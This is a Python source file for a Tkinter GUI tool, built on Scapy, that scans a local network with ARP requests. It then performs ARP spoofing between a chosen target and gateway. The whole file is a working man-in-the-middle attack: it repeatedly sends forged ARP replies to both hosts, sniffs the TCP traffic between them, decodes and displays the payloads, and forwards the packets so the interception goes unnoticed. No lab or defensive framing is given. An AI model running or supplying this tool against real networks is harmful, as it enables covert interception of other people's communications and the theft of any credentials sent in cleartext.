import os
import socket
import psutil
from scapy.all import ARP, Ether, srp, send, conf, sniff, IP, sendp, TCP, Raw
import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import sys
import traceback
import queue

# Adjust Scapy timeout and retry settings for large networks
conf.verb = 0  # Disable verbose output
SCAN_TIMEOUT = 2  # Increase timeout
SCAN_RETRIES = 3  # Number of retries

def handle_exceptions(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            args[0].log_message(f"Error: {e}\n{traceback.format_exc()}", 'red')
    return wrapper

class NetworkScanGUI:
    def __init__(self, master):
        self.master = master
        master.title("Network Scanning and ARP Spoofing Tool")
        self.create_widgets()
        self.scan_thread = None
        self.spoof_thread = None
        self.sniff_thread = None
        self.devices = []  # Store scanned devices
        self.spoofing = False
        self.spoof_thread_stop_event = threading.Event()
        self.sniff_thread_stop_event = threading.Event()
        self.log_queue = queue.Queue()
        self.set_network_interfaces()

        self.update_log()

    def create_widgets(self):
        self.create_scan_frame()
        self.create_devices_frame()
        self.create_spoof_frame()
        self.create_log_frame()

    def create_scan_frame(self):
        self.frame_scan = ttk.Frame(self.master)
        self.frame_scan.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
        self.label_interface = ttk.Label(self.frame_scan, text="Network Interface:")
        self.label_interface.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.interfaces = ttk.Combobox(self.frame_scan)
        self.interfaces.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.scan_button = ttk.Button(self.frame_scan, text="Scan Network", command=self.safe_scan_network)
        self.scan_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)

    def create_devices_frame(self):
        self.frame_devices = ttk.Frame(self.master)
        self.frame_devices.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)
        self.devices_treeview = ttk.Treeview(self.frame_devices, columns=("IP Address", "MAC Address"))
        self.devices_treeview.heading("#0", text="Device")
        self.devices_treeview.heading("IP Address", text="IP Address")
        self.devices_treeview.heading("MAC Address", text="MAC Address")
        self.devices_treeview.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)

    def create_spoof_frame(self):
        self.frame_spoof = ttk.Frame(self.master)
        self.frame_spoof.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
        self.label_target_ip = ttk.Label(self.frame_spoof, text="Target IP:")
        self.label_target_ip.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.target_ip_entry = ttk.Entry(self.frame_spoof)
        self.target_ip_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.label_gateway_ip = ttk.Label(self.frame_spoof, text="Gateway IP:")
        self.label_gateway_ip.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.gateway_ip_entry = ttk.Entry(self.frame_spoof)
        self.gateway_ip_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.spoof_button = ttk.Button(self.frame_spoof, text="Start ARP Spoofing", command=self.safe_start_arp_spoofing)
        self.spoof_button.grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.stop_button = ttk.Button(self.frame_spoof, text="Stop ARP Spoofing", command=self.safe_stop_arp_spoofing)
        self.stop_button.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)

    def create_log_frame(self):
        self.frame_log = ttk.Frame(self.master)
        self.frame_log.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W+tk.E)
        self.log_text = scrolledtext.ScrolledText(self.frame_log, wrap=tk.WORD, width=140, height=18, state='disabled')
        self.log_text.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)

    @handle_exceptions
    def set_network_interfaces(self):
        interfaces = self.get_network_interfaces()
        if interfaces:
            self.interfaces['values'] = list(interfaces)
            
            self.interfaces.set(list(interfaces)[0])

    @handle_exceptions
    def get_network_interfaces(self):
        return psutil.net_if_addrs().keys()

    def safe_scan_network(self):
        self.safe_method(self.scan_network)

    @handle_exceptions
    def scan_network(self):
        if self.scan_thread and self.scan_thread.is_alive():
            self.log_message("Network scan is already in progress.", 'blue')
            return
        selected_network = self.interfaces.get()
        self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
        self.scan_thread.start()

    @handle_exceptions
    def do_scan_network(self, selected_network):
        ip_range = self.get_ip_range(selected_network)
        
        if not ip_range:
            self.insert_to_treeview("Unable to get IP range for the selected network interface.")
            return

        self.insert_to_treeview(f"Scanning network: {ip_range}...")

        # Use Scapy for scanning
        devices = self.scan_with_scapy(ip_range=ip_range, interface=selected_network)
        unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
        self.devices = list(unique_devices.values())  # Store scanned devices

        for device in self.devices:
            self.insert_to_treeview(device['ip'], device['mac'])

    @handle_exceptions
    def get_ip_range(self, interface):
        print(interface)
        ip_address = self.get_ip_address(interface)
        netmask = self.get_netmask(interface)
        print(ip_address + '/' + netmask)
        if ip_address and netmask:
            return self.ip_to_cidr(ip_address, netmask)
        return None

    @handle_exceptions
    def get_ip_address(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        print(addrs)
        
        # Get IPv4:
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.address
        return None

    @handle_exceptions
    def get_netmask(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.netmask
        return None

    @handle_exceptions
    def ip_to_cidr(self, ip, netmask):
        ip_bits = "".join([bin(int(x))[2:].zfill(8) for x in ip.split(".")])
        netmask_bits = "".join([bin(int(x))[2:].zfill(8) for x in netmask.split(".")])
        cidr = sum([1 for bit in netmask_bits if bit == '1'])
        return f"{ip}/{cidr}"

    @handle_exceptions
    def scan_with_scapy(self, ip_range, interface):
        
        results = []
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=SCAN_TIMEOUT, retry=SCAN_RETRIES, iface=interface, verbose=False)[0]
        for sent, received in result:
            results.append({'ip': received.psrc, 'mac': received.hwsrc})
        return results

    @handle_exceptions
    def insert_to_treeview(self, ip, mac=None):
        if mac:
            self.devices_treeview.insert("", tk.END, text="Device", values=(ip, mac))
        else:
            self.devices_treeview.insert("", tk.END, text="Info", values=(ip, ""))

    @handle_exceptions
    def get_mac(self, ip):
        interface = self.interfaces.get()
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, iface=interface, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            self.log_message(f"No response for IP {ip}", 'red')
        return None

    def safe_start_arp_spoofing(self):
        self.safe_method(self.start_arp_spoofing)

    @handle_exceptions
    def start_arp_spoofing(self):
        if self.spoof_thread and self.spoof_thread.is_alive():
            self.log_message("ARP spoofing is already in progress.", 'blue')
            return
        target_ip = self.target_ip_entry.get()
        gateway_ip = self.gateway_ip_entry.get()
        if target_ip and gateway_ip:
            self.spoofing = True
            self.spoof_thread_stop_event.clear()
            self.sniff_thread_stop_event.clear()

            self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}", 'blue')
            self.spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
            self.spoof_thread.start()
            self.sniff_thread = threading.Thread(target=self.sniff_packets, args=(target_ip, gateway_ip))
            self.sniff_thread.start()
        else:
            self.log_message("Please provide both Target IP and Gateway IP.", 'red')

    def safe_stop_arp_spoofing(self):
        self.safe_method(self.stop_arp_spoofing)

    @handle_exceptions
    def stop_arp_spoofing(self):
        if not self.spoofing:
            self.log_message("ARP spoofing is not currently active.", 'blue')
            return
        self.log_message("Attempting to stop ARP spoofing...", 'blue')
        self.spoof_thread_stop_event.set()
        self.sniff_thread_stop_event.set()
        self.join_thread(self.spoof_thread)
        self.join_thread(self.sniff_thread)
        self.spoofing = False
        self.log_message("Stopped ARP spoofing.", 'blue')
        target_ip = self.target_ip_entry.get()
        gateway_ip = self.gateway_ip_entry.get()
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        self.restore_network(target_ip, gateway_ip, target_mac, gateway_mac)

    def join_thread(self, thread):
        if thread and thread.is_alive():
            thread.join(timeout=2)
            if thread.is_alive():
                self.log_message("Thread did not terminate properly.", 'red')

    @handle_exceptions
    def arp_spoof(self, target_ip, gateway_ip):
        # Get interface name
        interface = self.interfaces.get()

        # Get MAC addresses
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        # Craft ARP replys
        arp_reply1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
        arp_reply2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
        
        # Craft Ethernet frames
        ether_frame1 = Ether(dst=target_mac)
        ether_frame2 = Ether(dst=gateway_mac)

        # Combine Ethernet frames and ARP replys to make packets for each tảrget
        packet1 = ether_frame1 / arp_reply1
        packet2 = ether_frame2 / arp_reply2

        if not target_mac or not gateway_mac:
            self.log_message("Could not find MAC addresses for the provided IPs.", 'red')
            return

        try:
            while not self.spoof_thread_stop_event.is_set():
                sendp(packet1, iface=interface, verbose=False)
                sendp(packet2, iface=interface, verbose=False)
                self.spoof_thread_stop_event.wait(2)
        except Exception as e:
            self.log_message(f"Error in ARP spoofing: {e}", 'red')

    # Sniffer
    @handle_exceptions
    def sniff_packets(self, target_ip, gateway_ip):
        interface = self.interfaces.get()
        filter_str = f"tcp and ((src host {target_ip} and dst host {gateway_ip}) or (src host {gateway_ip} and dst host {target_ip}))"
        try:
            while not self.sniff_thread_stop_event.is_set():
                packets = sniff(filter=filter_str, count=10, timeout=10, iface=interface)
                for packet in packets:
                    self.log_packet(packet)
                    self.forward_packet(packet, target_ip, gateway_ip)
        except Exception as e:
            self.log_message(f"Error in sniffing packets: {e}", 'red')

    @handle_exceptions
    def log_packet(self, packet):
        if packet.haslayer(TCP) and packet.haslayer(IP):
            # Extract the TCP payload
            if packet.haslayer(Raw):
                tcp_payload = bytes(packet[Raw].load)
                if tcp_payload:
                    try:
                        # Decode the payload as UTF-8
                        decoded_payload = self.decode_payload(tcp_payload)
                        if decoded_payload:
                            print(f'{packet[IP].src} : {decoded_payload}')
                            self.log_message(f'{packet[IP].src} :', 'blue')  
                            self.log_message(f'{decoded_payload} \n', 'green')
                    except UnicodeDecodeError as e:
                        print(f"Failed to decode TCP payload: {e}")
                        self.log_message(f"Failed to decode TCP payload: {e}", 'red')
                    
    def decode_payload(self, payload):
        try:
            return payload.decode('utf-8')
        except UnicodeDecodeError:
            try:
                return payload.decode('latin-1')
            except UnicodeDecodeError:
                return repr(payload)

    @handle_exceptions
    def forward_packet(self, packet, target_ip, gateway_ip):
        if packet.haslayer(IP):
            ip_layer = packet.getlayer(IP)
            if ip_layer.src == target_ip and ip_layer.dst == gateway_ip:
                # Forward packet from target to gateway
                send(packet, verbose=False)
            elif ip_layer.src == gateway_ip and ip_layer.dst == target_ip:
                # Forward packet from gateway to target
                send(packet, verbose=False)

    @handle_exceptions
    def restore_network(self, target_ip, gateway_ip, target_mac, gateway_mac):
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)
        self.log_message(f"Restored network: Target IP={target_ip}, Gateway IP={gateway_ip}", 'blue')

    # Log message
    def log_message(self, message, color='black'):
        self.log_queue.put((message, color))

    # Update the log
    def update_log(self):
        while not self.log_queue.empty():
            message, color = self.log_queue.get_nowait()
            self.log_text.configure(state='normal')
            # Insert the message with a color tag
            self.log_text.insert(tk.END, message + '\n', color)
            self.log_text.configure(state='disabled')
            self.log_text.yview(tk.END)
        
        # Configure the tag to display red text
        self.log_text.tag_configure('red', foreground='red')
        self.log_text.tag_configure('green', foreground='green')
        self.log_text.tag_configure('blue', foreground='blue')
        self.log_text.tag_configure('black', foreground='black')

        # Recurring Call
        self.master.after(100, self.update_log)

    def safe_method(self, method):
        try:
            method()
        except Exception as e:
            self.log_message(f"Error: {e}\n{traceback.format_exc()}", 'red')

def main():
    try:
        root = tk.Tk()
        gui = NetworkScanGUI(root)
        root.protocol("WM_DELETE_WINDOW", lambda: on_close(root))
        root.mainloop()
    except Exception as e:
        print(f"GUI Error: {e}")

def on_close(root):
    root.destroy()
    sys.exit(0)

if __name__ == "__main__":
    main()
